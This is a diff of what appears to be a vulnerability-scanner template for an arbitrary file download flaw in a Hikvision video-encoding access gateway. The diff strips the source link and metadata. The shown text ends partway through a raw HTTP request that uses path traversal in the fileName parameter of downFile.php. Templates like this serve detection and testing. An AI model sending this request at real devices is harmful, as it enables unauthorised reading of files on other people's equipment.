@@ -3,12 +3,8 @@ info:
   name: HIKVISION 视频编码设备接入网关任意文件下载
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ilotkm0p7a0qfdof'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ilotkm0p7a0qfdof
-    fofa: 暂无
 http:
 - raw:
   - 'GET /serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php HTTP/1.1
